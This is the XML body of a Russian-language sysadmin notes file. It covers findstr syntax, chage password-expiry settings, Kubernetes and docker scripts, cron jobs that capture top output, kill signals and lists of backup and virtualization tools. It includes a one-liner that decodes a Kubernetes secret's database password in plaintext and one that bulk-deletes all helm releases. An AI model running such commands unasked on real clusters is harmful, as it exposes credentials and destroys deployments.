      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">dirlist</text:span><text:span text:style-name="T3">&gt; Выполняет поиск в указанном списке каталогов. Каждый каталог должен быть отделен точкой с запятой (например </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1;</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">2;</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">3 ,;).</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/&lt;</text:span><text:span text:style-name="T2">colorattribute</text:span><text:span text:style-name="T3">&gt; Задает атрибуты цвета с двумя шестнадцатеричными цифрами. Введите </text:span><text:span text:style-name="T2">color</text:span><text:span text:style-name="T3"> /? Дополнительные сведения.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">strings</text:span><text:span text:style-name="T3">&gt; Задает текст для поиска в файле </text:span><text:span text:style-name="T2">filename</text:span><text:span text:style-name="T3">. Обязательный.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[\&lt;</text:span><text:span text:style-name="T2">drive</text:span><text:span text:style-name="T3">&gt;:][&lt;</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">&gt;]&lt;</text:span><text:span text:style-name="T2">filename</text:span><text:span text:style-name="T3">&gt;[...] Указывает расположение и файл или файлы для поиска. Требуется по крайней мере одно имя файла.</text:span></text:p>
      <text:p text:style-name="P1">/? Отображает справку в командной строке.</text:p>
      <text:p text:style-name="P1">Допустимые мета-символы:</text:p>
      <text:p text:style-name="P1">. Подстановочный знак - любой символ</text:p>
      <text:p text:style-name="P1">* Повтор - ноль или более вхождений предыдущего символа или класса.</text:p>
      <text:p text:style-name="P1">^ Начальное расположение строки - начало строки.</text:p>
      <text:p text:style-name="P1">$ Конечное расположение строки - конец строки.</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">[</text:span><text:span text:style-name="T2">class</text:span><text:span text:style-name="T3">] Класс символов - любой символ в наборе.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">[^</text:span><text:span text:style-name="T2">class</text:span><text:span text:style-name="T3">] Обратный класс - любой символ, не наявляющийся в наборе.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">y</text:span><text:span text:style-name="T3">] </text:span><text:span text:style-name="T2">Range</text:span><text:span text:style-name="T3"> - все символы в указанном диапазоне.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">\</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Escape</text:span><text:span text:style-name="T3"> - литеральное использование мета-символа.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">\&lt;</text:span><text:span text:style-name="T2">string</text:span><text:span text:style-name="T3"> Начальное расположение слова - начало слова.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">string</text:span><text:span text:style-name="T3">\&gt; Конечное расположение слова -конец слова.</text:span></text:p>
      <text:p text:style-name="P1">Как заставить пользователя изменить пароль при следующем входе в систему? Существует несколько способов. Использование команды passwd</text:p>
      <text:p text:style-name="P1">#sudo passwd --expire [username]</text:p>
      <text:p text:style-name="P1">Использование команды chage</text:p>
      <text:p text:style-name="P1">#sudo chage --lastday 0 [username]</text:p>
      <text:p text:style-name="P1">Срок действия паролей</text:p>
      <text:p text:style-name="P1">#chage -l</text:p>
      <text:p text:style-name="P1">Будет выведена следующая информация:</text:p>
      <text:p text:style-name="P1">Когда пароль был последний раз изменен;</text:p>
      <text:p text:style-name="P1">Дата окончания действия пароля;</text:p>
      <text:p text:style-name="P1">Сколько дней осталось до окончания действия пароля;</text:p>
      <text:p text:style-name="P1">Когда учетная запись пользователя будет закончена (можно, пожалуйста, далее мы будем говорить «заэкспайрится»?)</text:p>
      <text:p text:style-name="P1">Минимальное количество дней между итерацией смены пароля;</text:p>
      <text:p text:style-name="P1">Максимальное количество дней между итерацией смены пароля;</text:p>
      <text:p text:style-name="P1">Заставляем пользователя менять пароль каждые 90 дней</text:p>
      <text:p text:style-name="P1">#sudo chage -M 90</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Задаем срок жизни учетной записи (до 12 июня 2023)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#sudo chage -E 2023-06-12 serg</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#sudo chage -E 2023-06-12 oleg</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Сколько времени на смену пароля? В примере даем Борису 10 дней на смену пароля с момента как пароль заэкспайрился</text:p>
      <text:p text:style-name="P1">#sudo chage -I 10 boris</text:p>
      <text:p text:style-name="P1">Уведомление о смене пароля заранее: Через 25 дней истекает срок годности пароля Бориса</text:p>
      <text:p text:style-name="P1">#sudo chage -W 25 boris</text:p>
      <text:p text:style-name="P1">Защищаемся от частой смены паролей пользователя: Минимальное количество дней между сменой паролей</text:p>
      <text:p text:style-name="P1">#sudo chage -m 25 boris</text:p>
      <text:p text:style-name="P1">Удалить ограничение в днях</text:p>
      <text:p text:style-name="P7">#sudo chage -m 0 sergey</text:p>
      <text:p text:style-name="P1">Kubernetes: эффективные команды Расшировать параметр секрета: kubectl get secret/db -o yaml | grep DB_PASSWORD | sed 's/.*DB_PASSWORD:\s//' | base64 --decode</text:p>
      <text:p text:style-name="P1">где db - имя секрета, DB_PASSWORD - один из параметров секрета.</text:p>
      <text:p text:style-name="P1">Удалить все поды используя helm: helm ls --all --short | xargs -L1 helm delete</text:p>
      <text:p text:style-name="P1">Удалить все поды в состоянии Evicted: kubectl get pods | grep Evicted | awk '{print $1}' | xargs kubectl delete pod</text:p>
      <text:p text:style-name="P1">Скрипт для просмотра занятого пространства образами docker:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/usr/bin/env bash</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">for container in `kubectl get pods --template '{{range .items}}{{.metadata.name}}{{"\n"}}{{end}}'`</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">do</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo -e "$container\t\t $(docker image ls `kubectl get pod $container -o jsonpath='{.spec.containers[0].image}'` --format='{{println .Size}}')"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">done</text:p>
      <text:p text:style-name="P1">Скрипт для для установления соответствия между задеплоеными подами, нодами, где они находятся и зоной в которой располагаются.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/usr/bin/env bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">set -euo pipefail</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PODZONES=()</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">for POD in $(kubectl get pods -o custom-columns=NAME:.metadata.name --no-headers)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>do</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>NODE=$(kubectl get pod ${POD} -o=jsonpath='{.spec.nodeName}')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>ZONE=$(kubectl get nodes -o json | jq <text:s/>-r --arg NODE "${NODE}" '.items[].metadata | {name, labels} | select(.name==$NODE) | .labels."topology.kubernetes.io/zone"')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>PODZONES+=(${ZONE})</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>echo -e "${POD}\t${NODE}\t${ZONE}"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">done</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CPODS=$(kubectl get pods -o custom-columns=NAME:.metadata.name --no-headers | wc -l)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CNODES=$(kubectl get nodes -o custom-columns=NAME:.metadata.name --no-headers | wc -l)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CZONES=$(kubectl get nodes -o json | jq <text:s/>-r '.items[].metadata.labels."topology.kubernetes.io/zone"' | sort | uniq -c)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "----------</text:span><text:span text:style-name="T3">ИТОГО</text:span><text:span text:style-name="T2">:----------"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo -e "</text:span><text:span text:style-name="T3">Всего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">подов</text:span><text:span text:style-name="T2">:\t${CPODS}"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo -e "</text:span><text:span text:style-name="T3">Всего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">нод</text:span><text:span text:style-name="T2">:\t${CNODES}"</text:span></text:p>
      <text:p text:style-name="P1">echo -e "Количество зон нод:\n${CZONES}"</text:p>
      <text:p text:style-name="P1">echo "Количество подов в зонах:"</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">printf "%s\n" "${PODZONES[@]}" | sort | uniq -c</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сохраняем вывода команды </text:span><text:span text:style-name="T2">Top</text:span><text:span text:style-name="T3"> в файл. Поскольку я не использовал опцию </text:span><text:span text:style-name="T2">delay</text:span><text:span text:style-name="T3">, приведенная ниже команда </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> перенаправит вывод команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> за одну итерацию в файл.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">top -b -n 1 &gt; /home/i_odmin/backup/output.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сохранение вывода команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">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text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">’, как показано ниже:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#top -n 5 -d 4 -b &gt;/backup/output_1.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Как захватить вывод команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">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text:span><text:span text:style-name="T2">CPU</text:span><text:span text:style-name="T3"> и памяти в системе. Добавляем следующий </text:span><text:span text:style-name="T2">cronjob</text:span><text:span text:style-name="T3">, который будет выполняться с 5 до 6 утра каждые 5 минут в течение часа.</text:span></text:p>
      <text:p text:style-name="P13">Где:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> : Задает максимальное количество итераций;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3"> : Работа в пакетном режиме (Запуск команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> в пакетном режиме для перенаправления вывода в другие программы или в файл);</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> : Интервал задержки (Задает задержку между обновлениями экрана).</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#0-59/5 5 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Собраем вывод в один файл, используйте следующий </text:span><text:span text:style-name="T2">cronjob</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Cronjob</text:span><text:span text:style-name="T3"> будет выполняться с 9 до 10 утра каждые 5 минут в течение часа и добавлять результаты в один файл.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#0-59/5 9 * * * top -b -n5 -d 5 &gt;&gt;/home/i_odmin/backup/output.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Записываем вывод команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> в файл каждые 5 минут в течение получаса. Добавляем следующий </text:span><text:span text:style-name="T2">cronjob</text:span><text:span text:style-name="T3">, который будет запускаться каждые 5 минут с 13:30 до 14:00 в течение получаса.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">#30-59/5 13 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> - команда для принудительного завершения исполнения процесса:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Команда </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> является встроенной командой командной оболочки, предназначенной для отправки системных сигналов определенным процессам. Команда принимает числовые идентификаторы процессов, а также числовые или текстовые идентификаторы сигналов. Чаще всего данная команда используется для принудительного завершения работы определенных процессов. Базовый синтаксис команды выглядит следующим образом:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> [параметры] идентификатор-процесса</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Команда поддерживает ряд параметров командной строки. Наиболее полезным параметром является параметр -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3">, позволяющий указать системный сигнал, который может быть отправлен заданному процессу, а также параметр -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3">, позволяющий вывести список поддерживаемых системных сигналов. Вообще, сигналы могут задаваться в нескольких форматах:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате имени сигнала после параметра -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате номера сигнала после параметра -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 5)</text:span></text:p>
      <text:p text:style-name="P1">В формате номера сигнала (-5)</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате имени сигнала с префиксом </text:span><text:span text:style-name="T2">SIG</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате имени сигнала без префикса </text:span><text:span text:style-name="T2">SIG</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">KILL</text:span><text:span text:style-name="T3">).</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">По умолчанию команда осуществляет осуществляет отправку сигнала </text:span><text:span text:style-name="T2">SIGTERM</text:span><text:span text:style-name="T3"> для корректного завершения работы процессов. Отрицательные значения идентификаторов используются для указания групп процессов, которым нужно отправить сигналы. Идентификатор -1 является специализированным идентификатором и используется для отправки сигналов всем запущенным процессам за исключением </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">init</text:span><text:span text:style-name="T3">. Для получения идентификаторов процессов могут использоваться утилиты </text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">. Примеры использования. Получение списка поддерживаемых системных сигналов. Для того, чтобы получить список поддерживаемых системных сигналов, достаточно использовать параметр -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> рассматриваемой утилиты:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ kill -l</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">6) SIGABRT 7) SIGBUS 8 ) SIGFPE 9) SIGKILL 10) SIGUSR1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">16) SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 30) SIGPWR</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">31) SIGSYS 34) SIGRTMIN 35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">38) SIGRTMIN+4 39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">58) SIGRTMAX-6 59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">63) </text:span><text:span text:style-name="T2">SIGRTMAX</text:span><text:span text:style-name="T3">-1 64) </text:span><text:span text:style-name="T2">SIGRTMAX</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Завершение работы процесса. Для завершения работы процесса достаточно передать его идентификатор команде </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3">. В данном случае в качестве рассматриваемого процесса будет использоваться предварительно запущенный процесс </text:span><text:span text:style-name="T2">ping</text:span><text:span text:style-name="T3"> (в первой вкладке эмулятора терминала):</text:span></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1">…</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для получения его идентификатора достаточно использовать команду </text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">aux</text:span><text:span text:style-name="T3">, а также фильтр </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ping</text:span><text:span text:style-name="T3"> (во второй вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ps aux | grep ping</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">…</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">alex 14371 0.0 0.0 18888 1024 pts/0 S+ 21:08 0:00 ping 127.0.0.1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">alex</text:span><text:span text:style-name="T3"> 14381 0.0 0.0 17628 908 </text:span><text:span text:style-name="T2">pts</text:span><text:span text:style-name="T3">/1 </text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3">+ 21:08 0:00 </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ping</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Процесс имеет идентификатор 14371. Для его завершения достаточно использовать команду </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> (также во второй вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> 14371</text:span></text:p>
      <text:p text:style-name="P1">В результате исполнение процесса будет остановлено (в первой вкладке эмулятора терминала):</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2" loext:marker-style-name="T1"><text:span text:style-name="T2">…</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">64 bytes from 127.0.0.1: icmp_seq=37 ttl=64 time=0.052 ms</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Завершено</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Завершение работы зависшего процесса. В случае зависшего процесса или процесса, игнорирующего сигнал </text:span><text:span text:style-name="T2">SIGTERM</text:span><text:span text:style-name="T3">, следует использовать сигнал </text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P13">Для этого следует преобразовать недавно рассмотренную команду:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> 14371</text:span></text:p>
      <text:p text:style-name="P1">В команду:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3"> 14371</text:span></text:p>
      <text:p text:style-name="P7">Исполнение процесса должно завершиться в любом случае.</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oft-page-break/><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Установить SUID-бит на файл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Установить SGID-бит на директории /home/public</text:span><text:span text:style-name="T2"/></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1">Отличное введение в концепции криптографии для начинающих:</text:p>
      <text:p text:style-name="P1">Часть 1: https://sergioprado.blog/introduction-to-encryption-for-embedded-linux-developers/</text:p>
      <text:p text:style-name="P1">Часть 2: https://sergioprado.blog/a-hands-on-approach-to-symmetric-key-encryption/</text:p>
      <text:p text:style-name="P7">Часть 3: https://sergioprado.blog/asymmetric-key-encryption-and-digital-signatures-in-practice/</text:p>
      <text:p text:style-name="P1">Как в Excel найти одинаковые значения?</text:p>
      <text:p text:style-name="P1">В Excel таблицах, особенно больших, дубликаты данных - довольно частое явление. Иногда они нужны и их можно не трогать, иногда их следует удалить, чтобы они не влияли на статистику, а иногда их просто нужно выделить.</text:p>
      <text:p text:style-name="P1">Чтобы быстро найти повторяющиеся значения:</text:p>
      <text:p text:style-name="P1">1. Выделите диапазон, в котором нужно найти повторяющиеся значения.</text:p>
      <text:p text:style-name="P13">2. На вкладке «Главная» выберите «Условное форматирование» → «Правило выделения ячеек» → «Повторяющиеся значения» → «ОК».</text:p>
      <text:p text:style-name="P13">3. В разделе «Сортировка и фильтр» выберите «Фильтр» и установите фильтр по цвету выделения.</text:p>
      <text:p text:style-name="P7">После всех манипуляций в списке останутся только одинаковые выделенные значения. Если вам затем нужно увидеть уникальные ячейки из этого списка, используйте функцию UNIQUE.</text:p>
      <text:p text:style-name="P1">Подборка софта с открытым исходным кодом для резервного копирования:</text:p>
      <text:p text:style-name="P1">Amanda (http://www.amanda.org/) - Инструмент резервного копирования по модели клиент-сервер.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Backupninja (https://0xacab.org/liberate/backupninja)- Легкая, расширяемая мета-система резервного копирования.</text:span></text:p>
      <text:p text:style-name="P1">BackupPC (https://backuppc.github.io/backuppc/) - высокопроизводительная система для резервного копирования на диск.</text:p>
      <text:p text:style-name="P1">Bareos (http://www.bareos.org/en/) - Форк инструмента резервного копирования Bacula.</text:p>
      <text:p text:style-name="P1">Barman (http://www.pgbarman.org/) - Менеджер резервного копирования и восстановления для аварийного восстановления серверов PostgreSQL.</text:p>
      <text:p text:style-name="P1">BorgBackup (https://github.com/borgbackup/borg) - форк дедуплицирующей программы резервного копирования Attic, написанной на Python.</text:p>
      <text:p text:style-name="P1">Burp (http://burp.grke.org/) - Программа резервного копирования и восстановления данных по сети.</text:p>
      <text:p text:style-name="P1">DREBS (https://github.com/dojo4/drebs) - Скрипт резервного копирования AWS EBS, поддерживающий стратегии.</text:p>
      <text:p text:style-name="P1">Dar (http://dar.linux.free.fr/)- Что означает Disk ARchive, это надежная и многофункциональная программа архивирования и резервного копирования в стиле tar. (Исходный код) GPL-2.0 C++</text:p>
      <text:p text:style-name="P1">Duplicati (http://www.duplicati.com/)- Многочисленные бэкэнды, шифрование, web-ui и инструмент резервного копирования для нескольких ОС.</text:p>
      <text:p text:style-name="P1">Duplicity (https://duplicity.gitlab.io/) - Шифрованное резервное копирование с эффективной пропускной способностью, использующее алгоритм rsync.</text:p>
      <text:p text:style-name="P1">Elkarbackup (https://github.com/elkarbackup/elkarbackup) - Решение для резервного копирования на основе RSnapshot с простым веб-интерфейсом.</text:p>
      <text:p text:style-name="P1">rclone (https://rclone.org/)- программа командной строки для синхронизации файлов и каталогов с несколькими облачными системами хранения/провайдерами.</text:p>
      <text:p text:style-name="P1">Rdiff-backup (http://www.nongnu.org/rdiff-backup/) - простое удаленное инкрементное резервное копирование всех ваших файлов.</text:p>
      <text:p text:style-name="P1">Restic (https://restic.net/) - Безопасный инструмент удаленного резервного копирования. Разработан для простого, быстрого, надежного и эффективного резервного копирования.</text:p>
      <text:p text:style-name="P1">Rsnapshot (http://rsnapshot.org/)- Утилита для создания моментальных снимков файловой системы.</text:p>
      <text:p text:style-name="P1">Shield (https://github.com/starkandwayne/shield)- подключаемая архитектура для резервного копирования и восстановления систем баз данных.</text:p>
      <text:p text:style-name="P13">Snebu (http://www.snebu.com/)- Резервное копирование моментальных снимков с глобальной мультиклиентской дедупликацией и прозрачным сжатием.</text:p>
      <text:p text:style-name="P13">UrBackup (http://www.urbackup.org/) - Еще одна клиент-серверная система резервного копирования.</text:p>
      <text:p text:style-name="P7">ZBackup (http://zbackup.org/) - Универсальный инструмент резервного копирования с дедупликацией.</text:p>
      <text:p text:style-name="P1">Подборка программного обеспечения для виртуализации:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">ConVirt <text:s/>(http://www.convirture.com/products_opensource.php)- Предоставляет основные функции для централизованного управления виртуализированной средой KVM или Xen.</text:span></text:p>
      <text:p text:style-name="P1">Ganeti (http://www.ganeti.org/) - Программное средство управления кластерными виртуальными серверами, построенное на базе KVM и Xen.</text:p>
      <text:p text:style-name="P1">KVM (http://www.linux-kvm.org/) - инфраструктура виртуализации ядра Linux.</text:p>
      <text:p text:style-name="P1">OpenNebula (http://opennebula.org/) - Гибкое корпоративное облако, сделанное простым.</text:p>
